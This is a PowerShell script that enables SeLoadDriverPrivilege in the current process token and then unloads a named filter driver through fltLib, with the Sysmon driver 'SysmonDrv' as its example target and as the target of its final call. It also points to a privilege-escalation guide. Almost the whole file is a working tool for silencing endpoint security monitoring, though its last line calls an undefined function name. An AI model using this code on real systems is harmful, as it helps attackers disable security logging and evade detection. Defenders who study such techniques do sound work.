function Enable-SeLoadDriverPrivilege {
<#
.SYNOPSIS
    
	Enables SeLoadDriverPrivilege for the current (powershell/ise) process.
	You have to have the privilege in your token first - check it with "whoami /priv" if not sure.
	The full scenario for rights elevation is described at https://github.com/gtworek/Priv2Admin under "SeLoadDriver" section.
    
.DESCRIPTION
	Author: Grzegorz Tworek
	Required Dependencies: None
	Optional Dependencies: None
	    
.EXAMPLE
	C:\PS> Enable-SeLoadDriverPrivilege
#>

	# API Calls interface for: OpenProcessToken, LookupPrivilegeValue, AdjustTokenPrivileges, GetLastError
	# Structure definition for: TokPriv1Luid

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct TokPriv1Luid
	{
		public int Count;
		public long Luid;
		public int Attr;
	}
	
	public static class Advapi32
	{
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool OpenProcessToken(
			IntPtr ProcessHandle, 
			int DesiredAccess,
			ref IntPtr TokenHandle);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool LookupPrivilegeValue(
			string lpSystemName,
			string lpName,
			ref long lpLuid);
			
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool AdjustTokenPrivileges(
			IntPtr TokenHandle,
			bool DisableAllPrivileges,
			ref TokPriv1Luid NewState,
			int BufferLength,
			IntPtr PreviousState,
			IntPtr ReturnLength);
			
	}
	
	public static class Kernel32
	{
		[DllImport("kernel32.dll")]
		public static extern uint GetLastError();
	}
"@
	
	# Get current process (powershell) handle
	$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
	Write-Debug "Current process handle: $ProcHandle"
		
	# Open token handle with TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
	Write-Debug "Calling OpenProcessToken()"
	$hTokenHandle = [IntPtr]::Zero
	$CallResult = [Advapi32]::OpenProcessToken($ProcHandle, 0x28, [ref]$hTokenHandle)
	Write-Debug "Token handle: $hTokenHandle"
		
	# Prepare TokPriv1Luid container
	$TokPriv1Luid = New-Object TokPriv1Luid
	$TokPriv1Luid.Count = 1
	$TokPriv1Luid.Attr = 0x00000002 # SE_PRIVILEGE_ENABLED
			
	# Get SeLoadDriverPrivilege luid
	$LuidVal = $Null
	Write-Debug "Calling LookupPrivilegeValue for SeLoadDriverPrivilege"
	$CallResult = [Advapi32]::LookupPrivilegeValue($null, "SeLoadDriverPrivilege", [ref]$LuidVal)
	Write-Debug "SeLoadDriverPrivilege LUID value: $LuidVal"
	$TokPriv1Luid.Luid = $LuidVal
			
	# Enable SeLoadDriverPrivilege for the current process
	Write-Debug "Calling AdjustTokenPrivileges"
	$CallResult = [Advapi32]::AdjustTokenPrivileges($hTokenHandle, $False, [ref]$TokPriv1Luid, 0, [IntPtr]::Zero, [IntPtr]::Zero)
	$LastError = [Kernel32]::GetLastError()
	Write-Debug "GetLastError returned: $LastError"
    #0 - OK.
    #6 - one of previous steps failed. Observe the output for handles equal to 0 or just re-run entire script.
    #1300 - privilege not held

}



function Unload-FilterDriver {
<#

.SYNOPSIS
    
    Unloads specified filter driver using the same dll call fltmc uses. It requires enabling SeLoadDriverPrivilege.
    The approach is not documented but Windows does it, so I try as well.
    
.DESCRIPTION
	Author: Grzegorz Tworek
	Required Dependencies: None
	Optional Dependencies: None
	    
.EXAMPLE
	C:\PS> Unload-FilterDriver "SysmonDrv"

#>

    param(
    [Parameter(Mandatory = $true)][string]$FilterName
    )

Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;

    public static class fltLib
    {
        [DllImport("fltLib.dll", SetLastError = true)]
        public static extern int FilterUnload(
             string lpFilterName
        );
    }
    public static class Kernel32_u
	{
		[DllImport("kernel32.dll")]
		public static extern uint GetLastError();
	}

"@

[fltLib]::FilterUnload($FilterName)
$lasterror = [Kernel32_u]::GetLastError()
Write-Debug "GetLastError returned: $LastError"
}


$DebugPreference = "Continue"
Enable-SeLoadDriverPrivilege
Unload-Driver "SysmonDrv"
